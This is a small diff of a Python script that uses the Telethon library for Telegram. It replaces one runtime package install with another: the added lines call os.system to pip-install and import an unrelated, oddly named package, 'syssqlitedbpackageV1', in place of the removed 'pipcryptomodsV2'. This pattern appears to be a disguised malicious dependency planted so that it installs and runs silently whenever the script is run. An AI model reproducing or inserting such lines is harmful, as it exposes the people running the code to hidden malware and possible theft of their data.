@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptomodsV2")
-import pipcryptomodsV2
+os.system("pip install syssqlitedbpackageV1")
+import syssqlitedbpackageV1
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
 from telethon.tl.types import InputPeerEmpty, InputPeerChannel
